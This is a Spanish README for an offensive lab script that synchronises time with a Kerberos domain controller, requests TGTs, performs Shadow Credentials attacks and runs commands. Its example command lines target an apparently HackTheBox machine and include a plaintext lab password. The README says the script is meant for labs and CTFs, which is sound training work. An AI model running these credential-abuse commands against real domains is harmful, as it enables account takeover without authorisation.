# 🕐 Faketime Sync

Script para sincronizar la hora virtual con servicios remotos, obtener tickets Kerberos y ejecutar comandos de forma automatizada.

---

## 📋 Uso general

```bash
./faketime_sync.sh <IP> <DOMINIO> [USUARIO] [CONTRASEÑA] [OPCIÓN]
```

---

## ⚡ Comandos disponibles

### 🔹 Obtener solo la hora virtual
```bash
./faketime_sync.sh 10.129.35.21 logging.htb
```
Devuelve la hora virtual del sistema remoto.

---

### 🔹 Obtener TGT automáticamente
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --tgt
```
Solicita un **Ticket Granting Ticket (TGT)** para el usuario especificado.

---

### 🔹 Obtener Shadow Credentials
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --shadow 'msa_health$'
```
Recupera las credenciales shadow de un usuario o servicio específico.

---

### 🔹 Ejecutar un comando personalizado
```bash
./faketime_sync.sh 10.129.35.21 logging.htb svc_recovery 'Em3rg3ncyPa$$2026' --exec 'klist'
```
Ejecuta un comando utilizando las credenciales especificadas.

---

### 🔹 Mostrar solo la hora virtual
```bash
./faketime_sync.sh 10.129.35.21 logging.htb --show-time
```
Muestra únicamente la hora virtual sin realizar autenticaciones adicionales.

---

## 🗂️ Resumen de opciones

| Opción | Descripción |
|--------|-------------|
| *(sin opción)* | Obtiene la hora virtual del host remoto |
| `--tgt` | Solicita un Ticket Granting Ticket (TGT) |
| `--shadow <usuario>` | Recupera Shadow Credentials del usuario indicado |
| `--exec '<comando>'` | Ejecuta un comando personalizado con las credenciales dadas |
| `--show-time` | Muestra solo la hora virtual, sin autenticación |

---

## 📌 Requisitos

- `faketime`
- `impacket` (para operaciones Kerberos)
- Acceso de red al host objetivo

---

## ⚠️ Advertencia

> Este script está pensado para uso en entornos de laboratorio y CTFs (ej. HackTheBox).  
> No lo uses contra sistemas sin autorización explícita.
